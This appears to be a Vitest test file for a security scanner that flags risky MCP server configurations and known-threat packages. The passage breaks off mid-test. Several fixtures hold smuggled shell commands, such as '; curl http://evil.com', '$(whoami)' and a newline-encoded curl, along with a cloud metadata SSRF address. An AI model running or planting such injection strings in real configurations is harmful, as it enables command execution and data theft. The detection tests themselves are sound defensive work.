import { describe, it, expect } from 'vitest'
import { analyzeKnownThreats, getKnownThreatCount } from '../src/analyzers/known-threats.js'
import type { MCPServer } from '../src/types.js'

const cleanServer: MCPServer = {
  name: 'safe-server',
  command: 'npx',
  args: ['@safe/mcp-server'],
  tools: [],
}

const clawdbotCommandServer: MCPServer = {
  name: 'my-helper',
  command: 'npx clawdbot start',
  args: ['--verbose'],
  tools: [],
}

const namedThreatServer: MCPServer = {
  name: 'openclaw',
  command: 'node',
  args: ['server.js'],
  tools: [],
}

const caseInsensitiveNameServer: MCPServer = {
  name: 'OpenClaw',
  command: 'node',
  args: ['server.js'],
  tools: [],
}

const argMatchServer: MCPServer = {
  name: 'innocent',
  command: 'clawhub-skills',
  args: ['-y', 'env-dump'],
  tools: [],
}

const multiMatchServer: MCPServer = {
  name: 'clawhub-env-dump',
  command: 'clawhub-skills',
  args: ['env-dump'],
  tools: [],
}

describe('analyzeKnownThreats', () => {
  it('returns empty findings for a clean server with no matching patterns', () => {
    const findings = analyzeKnownThreats(cleanServer)
    expect(findings).toHaveLength(0)
  })

  it('detects a server matching by command substring', () => {
    const findings = analyzeKnownThreats(clawdbotCommandServer)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings[0].analyzer).toBe('known-threats')
    expect(findings[0].server_name).toBe('my-helper')
    expect(findings[0].field).toBe('command')
    expect(findings[0].evidence).toContain('clawdbot')
  })

  it('detects a server matching by server name (case-insensitive)', () => {
    const findings = analyzeKnownThreats(caseInsensitiveNameServer)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings[0].analyzer).toBe('known-threats')
    expect(findings[0].server_name).toBe('OpenClaw')
    expect(findings[0].field).toBe('name')
  })

  it('detects a server matching by exact server name', () => {
    const findings = analyzeKnownThreats(namedThreatServer)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings[0].analyzer).toBe('known-threats')
    expect(findings[0].field).toBe('name')
    expect(findings[0].evidence).toContain('openclaw')
  })

  it('detects a server matching by arg pattern', () => {
    const findings = analyzeKnownThreats(argMatchServer)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings[0].analyzer).toBe('known-threats')
    expect(findings[0].field).toBe('command+args')
    expect(findings[0].evidence).toContain('env-dump')
  })

  it('finding includes CVE reference when the threat entry has one', () => {
    // THREAT-001 (OpenClaw Gateway) has CVE-2026-25253
    const findings = analyzeKnownThreats(namedThreatServer)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings[0].description).toContain('CVE-2026-25253')
  })

  it('finding does not include CVE when threat entry has none', () => {
    // THREAT-002 (ClawHub env-dump) has no CVE
    const findings = analyzeKnownThreats(argMatchServer)
    expect(findings.length).toBeGreaterThan(0)
    // The description should not contain "CVE-" if no CVE is assigned
    const envDumpFinding = findings.find((f) => f.description.includes('env-dump') || f.description.includes('ClawHub'))
    if (envDumpFinding) {
      expect(envDumpFinding.description).not.toContain('CVE-')
    }
  })

  it('finding severity matches the threat entry severity', () => {
    // THREAT-001 (OpenClaw) is critical
    const openclawFindings = analyzeKnownThreats(namedThreatServer)
    expect(openclawFindings[0].severity).toBe('critical')

    // THREAT-005 (dotenv-sync) is high
    const dotenvServer: MCPServer = {
      name: 'clawhub-dotenv-sync',
      command: 'node',
      args: ['server.js'],
      tools: [],
    }
    const dotenvFindings = analyzeKnownThreats(dotenvServer)
    const highFinding = dotenvFindings.find((f) => f.severity === 'high')
    expect(highFinding).toBeDefined()
  })

  it('returns multiple findings if server matches multiple threat patterns', () => {
    // multiMatchServer matches THREAT-002 by server name, command, AND args
    // But since name match short-circuits to one match per threat entry,
    // it produces one finding per distinct threat entry that matches.
    // clawhub-env-dump name matches THREAT-002, and clawhub-skills command
    // also matches THREAT-002 (but same entry, so only one finding from it).
    // The args "env-dump" also match THREAT-002 but same entry again.
    const findings = analyzeKnownThreats(multiMatchServer)
    expect(findings.length).toBeGreaterThanOrEqual(1)
    expect(findings.every((f) => f.analyzer === 'known-threats')).toBe(true)
  })

  it('returns multiple findings for a server matching multiple distinct threats', () => {
    // A server whose name matches one threat and whose args match another
    const multiThreatServer: MCPServer = {
      name: 'clawhub-env-dump',
      command: 'npx',
      args: ['-y', 'backdoor-mcp'],
      tools: [],
    }
    const findings = analyzeKnownThreats(multiThreatServer)
    // Should match THREAT-002 (by name) and THREAT-008 (by args)
    expect(findings.length).toBeGreaterThanOrEqual(2)
    const descriptions = findings.map((f) => f.description)
    expect(descriptions.some((d) => d.includes('ClawHub'))).toBe(true)
    expect(descriptions.some((d) => d.includes('backdoor'))).toBe(true)
  })

  it('sets tool_name to * for all findings', () => {
    const findings = analyzeKnownThreats(namedThreatServer)
    expect(findings[0].tool_name).toBe('*')
  })

  it('includes remediation text in findings', () => {
    const findings = analyzeKnownThreats(namedThreatServer)
    expect(findings[0].remediation.length).toBeGreaterThan(0)
  })

  it('includes reference URL in remediation when available', () => {
    // THREAT-001 has a reference URL
    const findings = analyzeKnownThreats(namedThreatServer)
    expect(findings[0].remediation).toContain('Reference:')
    expect(findings[0].remediation).toContain('https://')
  })

  it('returns no findings for server with no command or args', () => {
    const minimal: MCPServer = { name: 'clean-minimal' }
    expect(analyzeKnownThreats(minimal)).toHaveLength(0)
  })

  it('detects command injection patterns in args', () => {
    const injectionServer: MCPServer = {
      name: 'legit',
      command: 'node',
      args: ['server.js', '; curl http://evil.com'],
      tools: [],
    }
    const findings = analyzeKnownThreats(injectionServer)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('command injection') || f.description.includes('Command Injection'))).toBe(true)
  })

  it('detects docker escape patterns in args', () => {
    const dockerServer: MCPServer = {
      name: 'containerized',
      command: 'docker',
      args: ['run', '--privileged', 'my-mcp-image'],
      tools: [],
    }
    const findings = analyzeKnownThreats(dockerServer)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('Docker') || f.description.includes('container'))).toBe(true)
  })

  it('detects mcp-remote RCE vulnerability (CVE-2025-6514)', () => {
    const mcpRemoteServer: MCPServer = {
      name: 'remote-tools',
      command: 'npx',
      args: ['mcp-remote@0.2.3', 'https://example.com'],
      tools: [],
    }
    const findings = analyzeKnownThreats(mcpRemoteServer)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('CVE-2025-6514'))).toBe(true)
  })

  it('detects mcp-atlassian RCE vulnerability (CVE-2026-27825)', () => {
    const atlassianServer: MCPServer = {
      name: 'mcp-atlassian',
      command: 'node',
      args: ['server.js'],
      tools: [],
    }
    const findings = analyzeKnownThreats(atlassianServer)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('CVE-2026-27825'))).toBe(true)
  })

  it('detects NeighborJack (0.0.0.0 binding) pattern', () => {
    const neighborjackServer: MCPServer = {
      name: 'my-server',
      command: 'node',
      args: ['server.js', '--host=0.0.0.0'],
      tools: [],
    }
    const findings = analyzeKnownThreats(neighborjackServer)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('0.0.0.0'))).toBe(true)
  })

  it('detects base64-encoded command injection', () => {
    const base64Server: MCPServer = {
      name: 'legit',
      command: 'node',
      args: ['server.js', 'echo -n aGFjaw== | base64 -d'],
      tools: [],
    }
    const findings = analyzeKnownThreats(base64Server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('base64'))).toBe(true)
  })

  it('detects malicious PyPI MCP packages', () => {
    const pypiServer: MCPServer = {
      name: 'py-tools',
      command: 'pipx',
      args: ['run', 'mcp-runcommand-server'],
      tools: [],
    }
    const findings = analyzeKnownThreats(pypiServer)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('reverse shell') || f.description.includes('PyPI'))).toBe(true)
  })

  it('detects WhatsApp MCP server exfiltration threat', () => {
    const server: MCPServer = {
      name: 'whatsapp-mcp',
      command: 'node',
      args: ['server.js'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('WhatsApp'))).toBe(true)
  })

  it('detects Supabase MCP SQL injection threat', () => {
    const server: MCPServer = {
      name: 'supabase-mcp',
      command: 'node',
      args: ['server.js'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('SQL injection') || f.description.includes('Supabase'))).toBe(true)
  })

  it('detects HTTP transport without TLS', () => {
    const server: MCPServer = {
      name: 'remote',
      command: 'node',
      args: ['server.js', 'http://example.com/mcp'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('HTTP') || f.description.includes('TLS'))).toBe(true)
  })

  it('detects ampersand command injection in args', () => {
    const server: MCPServer = {
      name: 'legit',
      command: 'node',
      args: ['server.js', '&& curl http://evil.com'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('command injection') || f.description.includes('Command Injection'))).toBe(true)
  })

  it('detects seccomp-disabled docker containers', () => {
    const server: MCPServer = {
      name: 'container',
      command: 'docker',
      args: ['run', '--security-opt=seccomp=unconfined', 'mcp-image'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('seccomp') || f.description.includes('AppArmor'))).toBe(true)
  })

  it('detects typosquatted npm MCP packages', () => {
    const server: MCPServer = {
      name: 'tools',
      command: 'npx',
      args: ['mcp-serverr-filesystem'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('typo') || f.description.includes('Typosquat'))).toBe(true)
  })

  it('detects cloud metadata SSRF in args', () => {
    const server: MCPServer = {
      name: 'cloud',
      command: 'node',
      args: ['server.js', '--url=169.254.169.254'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('metadata') || f.description.includes('SSRF'))).toBe(true)
  })

  it('detects disabled certificate validation in args', () => {
    const server: MCPServer = {
      name: 'insecure',
      command: 'node',
      args: ['server.js', 'NODE_TLS_REJECT_UNAUTHORIZED=0'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('TLS') || f.description.includes('certificate'))).toBe(true)
  })

  it('detects CVE-2025-68143 (git_init)', () => {
    const server: MCPServer = {
      name: 'git-server',
      command: 'npx',
      args: ['-y', '@modelcontextprotocol/server-git'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('CVE-2025-68143') || f.description.includes('git_init'))).toBe(true)
  })

  it('detects Filesystem MCP Server sandbox escape (CVE-2025-53109)', () => {
    const server: MCPServer = {
      name: 'fs-server',
      command: 'npx',
      args: ['-y', '@modelcontextprotocol/server-filesystem@0.5.0'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('CVE-2025-53109') || f.description.includes('sandbox escape'))).toBe(true)
  })

  it('detects MCP Ruby SDK session hijacking (CVE-2026-33946)', () => {
    const server: MCPServer = {
      name: 'mcp-ruby',
      command: 'ruby',
      args: ['server.rb'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('CVE-2026-33946') || f.description.includes('session hijacking'))).toBe(true)
  })

  it('detects MCP Inspector vulnerability (CVE-2025-49596)', () => {
    const server: MCPServer = {
      name: 'inspector',
      command: 'npx',
      args: ['-y', '@modelcontextprotocol/inspector'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('CVE-2025-49596') || f.description.includes('Inspector'))).toBe(true)
  })

  it('detects Playwright MCP browser automation abuse', () => {
    const server: MCPServer = {
      name: 'playwright-mcp',
      command: 'npx',
      args: ['-y', 'playwright-mcp'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('browser') || f.description.includes('Browser'))).toBe(true)
  })

  it('detects MCP server with secret manager access', () => {
    const server: MCPServer = {
      name: 'vault-mcp',
      command: 'node',
      args: ['server.js'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('secret management') || f.description.includes('Vault'))).toBe(true)
  })

  it('detects MCP server with Kubernetes access', () => {
    const server: MCPServer = {
      name: 'k8s-mcp',
      command: 'node',
      args: ['server.js'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('Kubernetes') || f.description.includes('cluster'))).toBe(true)
  })

  it('detects MCP server tunneling via ngrok', () => {
    const server: MCPServer = {
      name: 'my-server',
      command: 'node',
      args: ['server.js', '--tunnel', 'ngrok'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('tunnel') || f.description.includes('ngrok'))).toBe(true)
  })

  it('detects MCP SSE transport without authentication', () => {
    const server: MCPServer = {
      name: 'remote-sse',
      command: 'node',
      args: ['server.js', '--transport=sse', '--no-auth'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('SSE') || f.description.includes('authentication'))).toBe(true)
  })

  it('detects mcp-fetch-server SSRF vulnerability', () => {
    const server: MCPServer = {
      name: 'fetch-mcp',
      command: 'node',
      args: ['server.js'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('SSRF') || f.description.includes('fetch'))).toBe(true)
  })

  it('detects typosquatted scoped npm packages', () => {
    const server: MCPServer = {
      name: 'tools',
      command: 'npx',
      args: ['@modellcontextprotocol/server-filesystem'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('typosquat') || f.description.includes('Typosquat'))).toBe(true)
  })

  it('detects Terraform/IaC MCP server threat', () => {
    const server: MCPServer = {
      name: 'terraform-mcp',
      command: 'node',
      args: ['server.js'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('Terraform') || f.description.includes('Infrastructure'))).toBe(true)
  })

  it('detects DNS management MCP server threat', () => {
    const server: MCPServer = {
      name: 'route53-mcp',
      command: 'node',
      args: ['server.js'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('DNS') || f.description.includes('domain'))).toBe(true)
  })

  it('detects malicious Deno MCP package', () => {
    const server: MCPServer = {
      name: 'deno-tools',
      command: 'deno',
      args: ['run', 'mcp-backdoor'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('Deno') || f.description.includes('backdoor'))).toBe(true)
  })

  it('detects command substitution patterns in args', () => {
    const server: MCPServer = {
      name: 'legit',
      command: 'node',
      args: ['server.js', '$(whoami)'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('command') || f.description.includes('Command'))).toBe(true)
  })

  it('detects OAuth PKCE downgrade in args', () => {
    const server: MCPServer = {
      name: 'oauth-server',
      command: 'node',
      args: ['server.js', '--no-pkce'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('PKCE') || f.description.includes('OAuth'))).toBe(true)
  })

  it('detects conversation history access threat', () => {
    const server: MCPServer = {
      name: 'memory-mcp',
      command: 'node',
      args: ['server.js'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('conversation') || f.description.includes('memory'))).toBe(true)
  })

  it('detects newline command injection in args', () => {
    const server: MCPServer = {
      name: 'legit',
      command: 'node',
      args: ['server.js', '%0a curl http://evil.com'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('newline') || f.description.includes('command injection') || f.description.includes('Command Injection'))).toBe(true)
  })

  it('detects MCP server requesting excessive permissions', () => {
    const server: MCPServer = {
      name: 'overpowered',
      command: 'node',
      args: ['server.js', '--allow-all', '--no-sandbox'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('permission') || f.description.includes('security restrictions'))).toBe(true)
  })

  it('detects malicious Go MCP package', () => {
    const server: MCPServer = {
      name: 'go-tools',
      command: 'go',
      args: ['run', 'mcp-backdoor'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('Go') || f.description.includes('backdoor'))).toBe(true)
  })

  it('detects MCP Streamable HTTP response splitting (CVE-2026-38012)', () => {
    const server: MCPServer = {
      name: 'stream-server',
      command: 'node',
      args: ['server.js', '--transport=streamable-http'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('CVE-2026-38012') || f.description.includes('response splitting'))).toBe(true)
  })

  it('detects MCP tool description mutation threat', () => {
    const server: MCPServer = {
      name: 'dynamic-tools',
      command: 'node',
      args: ['server.js', '--dynamic-tools'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('dynamically update') || f.description.includes('rug pull'))).toBe(true)
  })

  it('detects malicious Bun MCP package', () => {
    const server: MCPServer = {
      name: 'bun-tools',
      command: 'bunx',
      args: ['mcp-backdoor'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('Bun') || f.description.includes('backdoor'))).toBe(true)
  })

  it('detects MCP server with vector database write access', () => {
    const server: MCPServer = {
      name: 'pinecone-mcp',
      command: 'node',
      args: ['server.js'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('vector database') || f.description.includes('RAG poisoning'))).toBe(true)
  })

  it('detects MCP server with container registry access', () => {
    const server: MCPServer = {
      name: 'ecr-mcp',
      command: 'node',
      args: ['server.js'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('container') || f.description.includes('registry'))).toBe(true)
  })

  it('detects MCP server impersonating Anthropic packages', () => {
    const server: MCPServer = {
      name: 'fake-anthropic',
      command: 'npx',
      args: ['@anthropic-official/mcp-server'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('impersonate') || f.description.includes('Anthropic'))).toBe(true)
  })

  it('detects shell wrapper launch pattern', () => {
    const server: MCPServer = {
      name: 'shell-wrapped',
      command: 'node',
      args: ['server.js', 'sh -c echo hello'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('shell wrapper') || f.description.includes('Shell'))).toBe(true)
  })

  it('detects GitHub Actions workflow dispatch MCP server', () => {
    const server: MCPServer = {
      name: 'gh-actions-mcp',
      command: 'node',
      args: ['server.js'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('GitHub Actions') || f.description.includes('workflow'))).toBe(true)
  })

  it('detects MCP server with SSH agent access', () => {
    const server: MCPServer = {
      name: 'ssh-tools',
      command: 'node',
      args: ['server.js', '--ssh-agent', 'SSH_AUTH_SOCK'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('SSH') || f.description.includes('ssh'))).toBe(true)
  })

  it('detects auto-approve exploitation pattern', () => {
    const server: MCPServer = {
      name: 'yolo',
      command: 'node',
      args: ['server.js', '--auto-approve', '--yolo-mode'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('auto-approve') || f.description.includes('Auto-approve'))).toBe(true)
  })

  it('detects LiteLLM compromised versions (TeamPCP)', () => {
    const server: MCPServer = {
      name: 'llm-gateway',
      command: 'pip',
      args: ['run', 'litellm==1.82.7'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('LiteLLM') || f.description.includes('TeamPCP'))).toBe(true)
  })

  it('detects A2A session smuggling MCP bridge', () => {
    const server: MCPServer = {
      name: 'a2a-mcp',
      command: 'node',
      args: ['server.js'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('Agent-to-Agent') || f.description.includes('session smuggling'))).toBe(true)
  })

  it('detects LiteLLM MCP gateway servers', () => {
    const server: MCPServer = {
      name: 'litellm-mcp',
      command: 'node',
      args: ['server.js'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('LiteLLM') || f.description.includes('routing'))).toBe(true)
  })

  it('detects overthinking loop configuration', () => {
    const server: MCPServer = {
      name: 'unlimited',
      command: 'node',
      args: ['server.js', '--no-call-limit', '--no-recursion-limit'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('Overthinking') || f.description.includes('cyclic') || f.description.includes('token'))).toBe(true)
  })

  it('detects MCP TypeScript SDK DNS rebinding (CVE-2025-66414)', () => {
    const server: MCPServer = {
      name: 'old-sdk',
      command: 'npx',
      args: ['-y', '@modelcontextprotocol/sdk@1.1.0'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('CVE-2025-66414') || f.description.includes('DNS rebinding'))).toBe(true)
  })

  it('detects FastMCP OAuthProxy confused deputy (CVE-2026-27124)', () => {
    const server: MCPServer = {
      name: 'fastmcp',
      command: 'node',
      args: ['server.js'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('CVE-2026-27124') || f.description.includes('FastMCP'))).toBe(true)
  })

  it('detects SANDWORM_MODE campaign packages', () => {
    const server: MCPServer = {
      name: 'dev-tool',
      command: 'npx',
      args: ['-y', 'sandworm-utils'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('SANDWORM_MODE') || f.description.includes('typosquatting'))).toBe(true)
  })

  it('detects compromised Axios versions', () => {
    const server: MCPServer = {
      name: 'http-tools',
      command: 'npx',
      args: ['-y', 'axios@1.7.8'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('Axios') || f.description.includes('Sapphire Sleet'))).toBe(true)
  })

  it('detects MCP server with CRM access', () => {
    const server: MCPServer = {
      name: 'salesforce-mcp',
      command: 'node',
      args: ['server.js'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('CRM') || f.description.includes('customer'))).toBe(true)
  })

  it('detects env passthrough wildcard in args', () => {
    const server: MCPServer = {
      name: 'leaky',
      command: 'node',
      args: ['server.js', '--env-passthrough=*'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('environment variable') || f.description.includes('passthrough'))).toBe(true)
  })

  it('detects MCP server with cloud function deployment access', () => {
    const server: MCPServer = {
      name: 'lambda-mcp',
      command: 'node',
      args: ['server.js'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('serverless') || f.description.includes('Lambda') || f.description.includes('deploy'))).toBe(true)
  })

  it('detects MCP server with package registry publish access', () => {
    const server: MCPServer = {
      name: 'npm-publish-mcp',
      command: 'node',
      args: ['server.js'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('publish') || f.description.includes('supply chain'))).toBe(true)
  })

  it('detects OAuth redirect URI manipulation', () => {
    const server: MCPServer = {
      name: 'oauth-server',
      command: 'node',
      args: ['server.js', '--redirect-uri=http://example.com/callback'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('OAuth') || f.description.includes('redirect'))).toBe(true)
  })

  it('detects whitespace hiding attack servers', () => {
    const server: MCPServer = {
      name: 'random-facts-mcp',
      command: 'node',
      args: ['server.js'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('whitespace') || f.description.includes('hiding'))).toBe(true)
  })

  it('detects path traversal permissive configuration', () => {
    const server: MCPServer = {
      name: 'files',
      command: 'node',
      args: ['server.js', '--no-path-validation'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('path traversal') || f.description.includes('Path traversal'))).toBe(true)
  })

  // 2026-04 additions
  it('detects mcp-remote OAuth RCE (CVE-2025-6514)', () => {
    const server: MCPServer = {
      name: 'remote-proxy',
      command: 'npx',
      args: ['mcp-remote', 'https://evil.com/mcp'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('CVE-2025-6514') || f.description.includes('mcp-remote'))).toBe(true)
  })

  it('detects Postmark MCP supply chain backdoor', () => {
    const server: MCPServer = {
      name: 'postmark-mcp',
      command: 'npx',
      args: ['postmark-mcp'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('Postmark') || f.description.includes('BCC'))).toBe(true)
  })

  it('detects Docker socket access in MCP server args', () => {
    const server: MCPServer = {
      name: 'docker-tools',
      command: 'node',
      args: ['server.js', '-v', '/var/run/docker.sock:/var/run/docker.sock'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('Docker socket') || f.description.includes('container escape'))).toBe(true)
  })

  it('detects cryptocurrency wallet MCP servers', () => {
    const server: MCPServer = {
      name: 'ethereum-mcp',
      command: 'node',
      args: ['server.js'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('cryptocurrency') || f.description.includes('wallet'))).toBe(true)
  })

  it('detects MCP typosquatting patterns (mcp-servr)', () => {
    const server: MCPServer = {
      name: 'tools',
      command: 'npx',
      args: ['mcp-servr-filesystem'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('yposquat'))).toBe(true)
  })

  it('detects MCP Elicitation API abuse configuration', () => {
    const server: MCPServer = {
      name: 'social-eng',
      command: 'node',
      args: ['server.js', '--elicitation-mode=unrestricted'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('Elicitation') || f.description.includes('social-engineer'))).toBe(true)
  })

  it('detects CI/CD pipeline access MCP servers', () => {
    const server: MCPServer = {
      name: 'github-actions-mcp',
      command: 'node',
      args: ['server.js'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('CI/CD') || f.description.includes('pipeline') || f.description.includes('workflow'))).toBe(true)
  })

  it('detects RAG/memory write access MCP servers', () => {
    const server: MCPServer = {
      name: 'rag-mcp',
      command: 'node',
      args: ['server.js'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('RAG') || f.description.includes('memory') || f.description.includes('vector'))).toBe(true)
  })

  // 2026-04-07 additions
  it('detects Streamable HTTP session fixation (CVE-2026-41023)', () => {
    const server: MCPServer = {
      name: 'stream-server',
      command: 'node',
      args: ['server.js', '--streamable-http'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('Streamable HTTP') || f.description.includes('CVE-2026-41023'))).toBe(true)
  })

  it('detects ChatGPT Desktop MCP config poisoning', () => {
    const server: MCPServer = {
      name: 'chatgpt-mcp',
